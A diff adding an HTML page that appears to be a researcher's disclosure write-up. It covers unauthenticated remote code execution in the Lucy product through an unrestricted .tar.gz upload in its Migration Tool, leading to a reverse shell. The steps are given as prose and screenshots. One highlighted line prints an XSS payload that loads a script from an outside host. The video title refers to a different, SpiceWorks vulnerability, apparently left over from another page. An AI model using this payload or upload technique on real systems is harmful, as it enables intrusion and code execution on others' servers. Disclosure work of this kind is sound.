@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1">
+        <title>abu@abuyv.com</title>
+        <link rel="stylesheet" href="../css/semantic.css">
+        <link rel="stylesheet" href="../css/style.css">
+    </head>
+
+    <body>
+        <div id="particles-js"></div>
+        <div align="center" style="color:white" class="" id="nav">
+            <a class="ui secondary button" href="index.html">pgp</a>
+            <a class="ui secondary button" href="index.html">twitter</a>
+            <a class="ui secondary button" href="index.html">github</a>
+            <a class="ui secondary button" href="index.html">talks</a>
+            <a class="ui secondary button" href="spiceworks.html">cve</a>
+            <a class="ui secondary button" href="index.html">ctf</a>
+            <!--[ <a style="color:white" href="http://abuyv.com">pgp</a> ] -->	
+            <pre align="center" style="color:green;font-size:x-small;text-align: center">
+
+            </pre>
+
+            <div class="div-1">
+                <p style="text-align: left">
+                    An unauthenticated user can execute an Operating System command under the context of the web server user which is www-data.
+                </p>
+
+                <figure>
+                    <iframe src="https://www.youtube.com/embed/ukrVpKyl9uY" width="500" height="281" frameborder="0" allow="autoplay; fullscreen" allowfullscreen title="SpiceWorks CSRF via XSS PoC"></iframe>
+                </figure>
+                
+                Step 1: Lucy product’s Migration Tool under Support panel is vulnerable to unrestricted File Upload! 
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/01-migration.png" alt="" class="center"/></figure>
+
+                Step 2: So I can import .tar.gz which will extract its content without verification that any extension can be uploaded inside .tar.gz. 
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/02-tar.png" alt="" class="center"/></figure>
+
+                Step 3: In order to understand the migration's import section, let’s create a backup of Whitelabel Settings as shown below. 
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/03-whitelabel.png" alt="" class="center"/></figure>
+
+                Step 4:  Then visit to Backups to download exported files for further analysis.  
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/04-backup.png" alt="" class="center"/></figure>
+     
+                 <p style="background-color: red; border: 2px solid black; padding: 10px; background-repeat: no-repeat; background-size: 10px 10px">Payload: Abuyv">" &lt;script src="http://abuyv.com/abu.js">&lt;/script></p>
+
+                Step 5:   Downloaded .tar.gz contained the following file and folders. Basically, system.tar.gz is the one that is vulnerable to Unrestricted File Upload vulnerability.
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/05-content.png" alt="" class="center"/></figure>
+
+                Step 6:  I extracted system.tar.gz and I saw a migration tool backed up by a publicly accessible folder with the name of static   
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/06-static.png" alt="" class="center"/></figure>
+                
+                Step 7: So it’s time to be creative. I added my php payload into ./static/ folder and then I compressed all extracted folders to make it ready for the import.  
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/07-poc.png" alt="" class="center"/></figure>
+
+                Step 8: Finally my compressed backup file contained payload which will be accessible by any unauthenticated users once I could import it. 
+                So any unauthenticated users can execute this RCE vulnerability as it is not required to have authentication to access the uploaded files on /public/system/static/ folder.  
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/08-uploaded.png" alt="" class="center"/></figure>
+                
+                Step 9:   Finally, unauthenticated users can access the reverse shell on the following link.   
+
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/lucy/09-link-RCE.png" alt="" class="center"/></figure>
+
+                
+                
+            </div>
+        </div>
+
+
+        <script src="../js/particles.js"></script>
+        <script src="../js/config.js"></script>
+    </body>
+</html>
